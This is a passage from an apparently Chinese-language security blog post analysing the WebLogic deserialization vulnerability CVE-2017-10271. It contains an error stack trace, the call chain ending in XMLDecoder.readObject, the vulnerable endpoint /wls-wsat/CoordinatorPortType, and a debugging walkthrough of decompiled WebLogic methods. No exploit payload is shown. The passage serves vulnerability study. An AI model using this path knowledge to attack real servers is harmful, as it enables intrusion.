class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.beans.ObjectHandler&quot;</span> <span class="attr">file</span>=<span class="string">&quot;ObjectHandler.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;139&quot;</span> <span class="attr">method</span>=<span class="string">&quot;dequeueResult&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span> <span class="attr">file</span>=<span class="string">&quot;XMLDecoder.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;206&quot;</span> <span class="attr">method</span>=<span class="string">&quot;readObject&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.wsee.workarea.WorkContextXmlInputAdapter&quot;</span> <span class="attr">file</span>=<span class="string">&quot;WorkContextXmlInputAdapter.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;111&quot;</span> <span class="attr">method</span>=<span class="string">&quot;readUTF&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.workarea.spi.WorkContextEntryImpl&quot;</span> <span class="attr">file</span>=<span class="string">&quot;WorkContextEntryImpl.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;92&quot;</span> <span class="attr">method</span>=<span class="string">&quot;readEntry&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.workarea.WorkContextLocalMap&quot;</span> <span class="attr">file</span>=<span class="string">&quot;WorkContextLocalMap.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;179&quot;</span> <span class="attr">method</span>=<span class="string">&quot;receiveRequest&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.workarea.WorkContextMapImpl&quot;</span> <span class="attr">file</span>=<span class="string">&quot;WorkContextMapImpl.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;163&quot;</span> <span class="attr">method</span>=<span class="string">&quot;receiveRequest&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.wsee.jaxws.workcontext.WorkContextServerTube&quot;</span> <span class="attr">file</span>=<span class="string">&quot;WorkContextServerTube.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;71&quot;</span> <span class="attr">method</span>=<span class="string">&quot;receive&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.wsee.jaxws.workcontext.WorkContextTube&quot;</span> <span class="attr">file</span>=<span class="string">&quot;WorkContextTube.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;107&quot;</span> <span class="attr">method</span>=<span class="string">&quot;readHeaderOld&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.wsee.jaxws.workcontext.WorkContextServerTube&quot;</span> <span class="attr">file</span>=<span class="string">&quot;WorkContextServerTube.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;43&quot;</span> <span class="attr">method</span>=<span class="string">&quot;processRequest&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.ws.api.pipe.Fiber&quot;</span> <span class="attr">file</span>=<span class="string">&quot;Fiber.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;866&quot;</span> <span class="attr">method</span>=<span class="string">&quot;__doRun&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.ws.api.pipe.Fiber&quot;</span> <span class="attr">file</span>=<span class="string">&quot;Fiber.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;815&quot;</span> <span class="attr">method</span>=<span class="string">&quot;_doRun&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.ws.api.pipe.Fiber&quot;</span> <span class="attr">file</span>=<span class="string">&quot;Fiber.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;778&quot;</span> <span class="attr">method</span>=<span class="string">&quot;doRun&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.ws.api.pipe.Fiber&quot;</span> <span class="attr">file</span>=<span class="string">&quot;Fiber.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;680&quot;</span> <span class="attr">method</span>=<span class="string">&quot;runSync&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.ws.server.WSEndpointImpl$2&quot;</span> <span class="attr">file</span>=<span class="string">&quot;WSEndpointImpl.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;403&quot;</span> <span class="attr">method</span>=<span class="string">&quot;process&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.ws.transport.http.HttpAdapter$HttpToolkit&quot;</span> <span class="attr">file</span>=<span class="string">&quot;HttpAdapter.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;539&quot;</span> <span class="attr">method</span>=<span class="string">&quot;handle&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.ws.transport.http.HttpAdapter&quot;</span> <span class="attr">file</span>=<span class="string">&quot;HttpAdapter.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;253&quot;</span> <span class="attr">method</span>=<span class="string">&quot;handle&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.ws.transport.http.servlet.ServletAdapter&quot;</span> <span class="attr">file</span>=<span class="string">&quot;ServletAdapter.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;140&quot;</span> <span class="attr">method</span>=<span class="string">&quot;handle&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.wsee.jaxws.WLSServletAdapter&quot;</span> <span class="attr">file</span>=<span class="string">&quot;WLSServletAdapter.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;171&quot;</span> <span class="attr">method</span>=<span class="string">&quot;handle&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.wsee.jaxws.HttpServletAdapter$AuthorizedInvoke&quot;</span> <span class="attr">file</span>=<span class="string">&quot;HttpServletAdapter.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;708&quot;</span> <span class="attr">method</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.security.acl.internal.AuthenticatedSubject&quot;</span> <span class="attr">file</span>=<span class="string">&quot;AuthenticatedSubject.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;363&quot;</span> <span class="attr">method</span>=<span class="string">&quot;doAs&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.security.service.SecurityManager&quot;</span> <span class="attr">file</span>=<span class="string">&quot;SecurityManager.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;146&quot;</span> <span class="attr">method</span>=<span class="string">&quot;runAs&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.wsee.util.ServerSecurityHelper&quot;</span> <span class="attr">file</span>=<span class="string">&quot;ServerSecurityHelper.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;103&quot;</span> <span class="attr">method</span>=<span class="string">&quot;authenticatedInvoke&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.wsee.jaxws.HttpServletAdapter$3&quot;</span> <span class="attr">file</span>=<span class="string">&quot;HttpServletAdapter.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;311&quot;</span> <span class="attr">method</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.wsee.jaxws.HttpServletAdapter&quot;</span> <span class="attr">file</span>=<span class="string">&quot;HttpServletAdapter.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;336&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.wsee.jaxws.JAXWSServlet&quot;</span> <span class="attr">file</span>=<span class="string">&quot;JAXWSServlet.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;99&quot;</span> <span class="attr">method</span>=<span class="string">&quot;doRequest&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.servlet.http.AbstractAsyncServlet&quot;</span> <span class="attr">file</span>=<span class="string">&quot;AbstractAsyncServlet.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;99&quot;</span> <span class="attr">method</span>=<span class="string">&quot;service&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;javax.servlet.http.HttpServlet&quot;</span> <span class="attr">file</span>=<span class="string">&quot;HttpServlet.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;820&quot;</span> <span class="attr">method</span>=<span class="string">&quot;service&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.servlet.internal.StubSecurityHelper$ServletServiceAction&quot;</span> <span class="attr">file</span>=<span class="string">&quot;StubSecurityHelper.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;227&quot;</span> <span class="attr">method</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.servlet.internal.StubSecurityHelper&quot;</span> <span class="attr">file</span>=<span class="string">&quot;StubSecurityHelper.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;125&quot;</span> <span class="attr">method</span>=<span class="string">&quot;invokeServlet&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.servlet.internal.ServletStubImpl&quot;</span> <span class="attr">file</span>=<span class="string">&quot;ServletStubImpl.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;301&quot;</span> <span class="attr">method</span>=<span class="string">&quot;execute&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.servlet.internal.ServletStubImpl&quot;</span> <span class="attr">file</span>=<span class="string">&quot;ServletStubImpl.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;184&quot;</span> <span class="attr">method</span>=<span class="string">&quot;execute&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.servlet.internal.WebAppServletContext$ServletInvocationAction&quot;</span> <span class="attr">file</span>=<span class="string">&quot;WebAppServletContext.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;3732&quot;</span> <span class="attr">method</span>=<span class="string">&quot;wrapRun&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.servlet.internal.WebAppServletContext$ServletInvocationAction&quot;</span> <span class="attr">file</span>=<span class="string">&quot;WebAppServletContext.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;3696&quot;</span> <span class="attr">method</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.security.acl.internal.AuthenticatedSubject&quot;</span> <span class="attr">file</span>=<span class="string">&quot;AuthenticatedSubject.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;321&quot;</span> <span class="attr">method</span>=<span class="string">&quot;doAs&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.security.service.SecurityManager&quot;</span> <span class="attr">file</span>=<span class="string">&quot;SecurityManager.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;120&quot;</span> <span class="attr">method</span>=<span class="string">&quot;runAs&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.servlet.internal.WebAppServletContext&quot;</span> <span class="attr">file</span>=<span class="string">&quot;WebAppServletContext.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;2273&quot;</span> <span class="attr">method</span>=<span class="string">&quot;securedExecute&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.servlet.internal.WebAppServletContext&quot;</span> <span class="attr">file</span>=<span class="string">&quot;WebAppServletContext.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;2179&quot;</span> <span class="attr">method</span>=<span class="string">&quot;execute&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.servlet.internal.ServletRequestImpl&quot;</span> <span class="attr">file</span>=<span class="string">&quot;ServletRequestImpl.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;1490&quot;</span> <span class="attr">method</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.work.ExecuteThread&quot;</span> <span class="attr">file</span>=<span class="string">&quot;ExecuteThread.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;256&quot;</span> <span class="attr">method</span>=<span class="string">&quot;execute&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span>                        <span class="tag">&lt;<span class="name">ns2:frame</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.work.ExecuteThread&quot;</span> <span class="attr">file</span>=<span class="string">&quot;ExecuteThread.java&quot;</span> <span class="attr">line</span>=<span class="string">&quot;221&quot;</span> <span class="attr">method</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">ns2:frame</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">ns2:stackTrace</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">ns2:exception</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">detail</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">S:Fault</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">S:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">S:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2024/10/22/WebSecurity/cve/CVE-2017-10271/image-3.png"><br>分析调用栈，我们重点关注下面的调用流程：</p>
<ul>
<li>weblogic.wsee.jaxws.workcontext.WorkContextServerTube-&gt;processRequest</li>
<li>weblogic.wsee.jaxws.workcontext.WorkContextTube-&gt;readHeaderOld</li>
<li>weblogic.wsee.jaxws.workcontext.WorkContextServerTube-&gt;receive</li>
<li>weblogic.workarea.WorkContextMapImpl-&gt;receiveRequest</li>
<li>weblogic.workarea.WorkContextLocalMap-&gt;receiveRequest</li>
<li>weblogic.workarea.spi.WorkContextEntryImpl-&gt;readEntry</li>
<li>weblogic.wsee.workarea.WorkContextXmlInputAdapter-&gt;readUTF</li>
<li>java.beans.XMLDecoder-&gt;readObject</li>
</ul>
<p>回到漏洞利用时的漏洞地址：<code>POST /wls-wsat/CoordinatorPortType HTTP/1.1</code>，可以看到形成漏洞的接口应当是<code>wls-wsat</code>，查看源文件可以看到servlet映射关系<br><img src="/2024/10/22/WebSecurity/cve/CVE-2017-10271/image-4.png"></p>
<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>具体的步骤流程，我把断点打在了 <code>weblogic.wsee.jaxws.WLSServletAdapter</code> 类的handle函数，接下来跟进分析</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">(ServletContext var1, HttpServletRequest var2, HttpServletResponse var3)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (var2.getMethod().equals(<span class="string">&quot;GET&quot;</span>) || var2.getMethod().equals(<span class="string">&quot;HEAD&quot;</span>)) &#123;</span><br><span class="line">        <span class="type">HttpMetadataPublisher</span> <span class="variable">var4</span> <span class="operator">=</span> (HttpMetadataPublisher)<span class="built_in">this</span>.endpoint.getSPI(HttpMetadataPublisher.class);</span><br><span class="line">        <span class="keyword">if</span> (var4 != <span class="literal">null</span> &amp;&amp; var4.handleMetadataRequest(<span class="built_in">this</span>, <span class="built_in">this</span>.createConnection(var1, var2, var3))) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.isOraWsdlMetadataQuery(var2.getQueryString())) &#123;</span><br><span class="line">            <span class="built_in">this</span>.publishWSDL(<span class="built_in">this</span>.createConnection(var1, var2, var3));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">super</span>.handle(var1, var2, var3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段代码定义了一个 <code>handle</code> 方法，用于处理来自 Web 服务的 HTTP 请求。它是在一个可能属于 SOAP 或 REST Web服务的 Java 类中，处理特定类型的 HTTP 请求，尤其是针对元数据和 WSDL 发布。以下是对这个函数各部分的详细分析：<br>参数</p>
<ul>
<li><code>ServletContext var1</code>：这是一个接口，它为 servlet 定义了一个范围为整个应用的视图，使 servlet 能够获得关于其运行环境的信息。</li>
<li><code>HttpServletRequest var2</code>：表示客户端到服务器的请求信息，用于检查此次 HTTP 请求的方法和查询字符串。</li>
<li><code>HttpServletResponse var3</code>：表示服务器对客户端的响应，可用于设置响应的类型、内容等。</li>
</ul>
<ol>
<li><p><strong>检查请求方法</strong>:</p>
<ul>
<li>方法首先检查 HTTP 请求是否为 <code>GET</code> 或 <code>HEAD</code> 方法。这两种方法通常用于获取信息，不对服务器的状态进行更改。</li>
</ul>
</li>
<li><p><strong>处理元数据请求</strong>:</p>
<ul>
<li>如果请求方法是 <code>GET</code> 或 <code>HEAD</code>，代码尝试获取一个 <code>HttpMetadataPublisher</code> 的实例。这个实例可能是用于发布或处理与 HTTP 相关的元数据的。</li>
<li><code>this.endpoint.getSPI(HttpMetadataPublisher.class)</code> 方法调用可能是获取服务提供接口（SPI），用于具体的元数据发布逻辑。</li>
<li>如果 <code>var4.handleMetadataRequest(this, this.createConnection(var1, var2, var3))</code> 返回 <code>true</code>，说明对元数据的请求已被处理，并且没有更多的操作需要执行，方法会提前返回。</li>
</ul>
</li>
<li><p><strong>处理 WSDL 发布</strong>:</p>
<ul>
<li>接下来，如果请求的查询字符串是针对 WSDL 的（通过 <code>this.isOraWsdlMetadataQuery(var2.getQueryString())</code> 检查），则执行 <code>this.publishWSDL(this.createConnection(var1, var2, var3))</code>。</li>
<li>这一步可能涉及到 Web 服务描述语言（WSDL）的发布，它是一个 XML 格式的文档，描述了网络服务的接口，以便客户端知道如何与服务交互。</li>
<li>与处理元数据请求相同，如果处理了 WSDL 发布，方法也会提前返回。</li>
</ul>
</li>
<li><p><strong>调用父类处理方法</strong>:</p>
<ul>
<li>如果请求既不是元数据请求也不是 WSDL 查询，那么将通过调用 <code>super.handle(var1, var2, var3)</code> 来继续处理请求。这表明当前方法是在某个继承层次中，且父类也有处理请求的逻辑。</li>
</ul>
</li>
</ol>
<p>接下来跟进到：AuthenticatedSubject.java 的 doAs 方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">doAs</span><span class="params">(AbstractSubject var1, PrivilegedExceptionAction var2)</span> <span class="keyword">throws</span> PrivilegedActionException &#123;</span><br><span class="line">        <span class="keyword">if</span> (var2 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(SecurityLogger.getNullAction());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">var3</span> <span class="operator">=</span> SubjectManager.getSubjectManager().getSize();</span><br><span class="line">            SubjectManager.getSubjectManager().pushSubject(var1, <span class="built_in">this</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">var11</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                var11 = <span class="literal">true</span>;</span><br><span class="line">                var4 = var2.run();</span><br><span class="line">                var11 = <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (RuntimeException var12) &#123;</span><br><span class="line">                <span class="keyword">throw</span> var12;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var13) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">PrivilegedActionException</span>(var13);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (var11) &#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">var7</span> <span class="operator">=</span> SubjectManager.getSubjectManager().getSize();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">while</span>(var7-- &gt; var3) &#123;</span><br><span class="line">                        SubjectManager.getSubjectManager().popSubject(var1);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> <span class="variable">var5</span> <span class="operator">=</span> SubjectManager.getSubjectManager().getSize();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(var5-- &gt; var3) &#123;</span><br><span class="line">                SubjectManager.getSubjectManager().popSubject(var1);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> var4;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这段 Java 代码是一个实现特权动作执行的函数，通常用在安全敏感的环境中，比如 Java 的安全框架中。它的功能是在特定的安全上下文中执行传入的 <code>PrivilegedExceptionAction</code> 动作。下面是对这个函数 <code>doAs</code> 的逐步分析：<br>参数</p>
<ul>
<li><code>AbstractSubject var1</code>: 这个参数代表的是执行动作的主体（subject），在安全框架中用于表示操作的执行者。</li>
<li><code>PrivilegedExceptionAction var2</code>: 这是一个函数式接口，定义了需要在特定权限上下文中执行的操作。</li>
</ul>
<p>功能</p>
<ol>
<li><strong>参数校验</strong>: 函数首先检查 <code>var2</code> 是否为 null。如果是 null，则抛出一个 <code>SecurityException</code>，表示不能执行空的操作。</li>
<li><strong>主体上下文的推入</strong>: 在执行动作之前，函数使用 <code>SubjectManager.getSubjectManager().pushSubject(var1, this)</code> 将当前主体 <code>var1</code> 推入主体管理器的栈中。这是为了设置当前的安全上下文。</li>
<li><strong>执行动作</strong>:<ul>
<li>使用 <code>try</code> 块来执行 <code>var2.run()</code>，即执行传入的特权操作。</li>
<li>如果在执行过程中发生 <code>RuntimeException</code>，则直接将这个异常抛出。</li>
<li>如果发生其他类型的 <code>Exception</code>，则将其封装在一个 <code>PrivilegedActionException</code> 中抛出，这是为了处理特权操作可能抛出的检查型异常。</li>
</ul>
</li>
<li><strong>异常处理</strong>:<ul>
<li><code>finally</code> 块确保无论 <code>var2.run()</code> 执行过程中发生什么情况（包括异常），都将当前主体从主体管理器的栈中弹出，直到栈的大小回到初始状态 <code>var3</code>。</li>
<li>这一步是必要的，以确保安全上下文在操作完成后能恢复到原始状态，防止安全漏洞。</li>
</ul>
</li>
<li><strong>恢复主体上下文</strong>:<ul>
<li>在 <code>try</code> 块后，有另一个循环用于处理异常外的情况，同样确保主体栈被正确清理。</li>
</ul>
</li>
</ol>
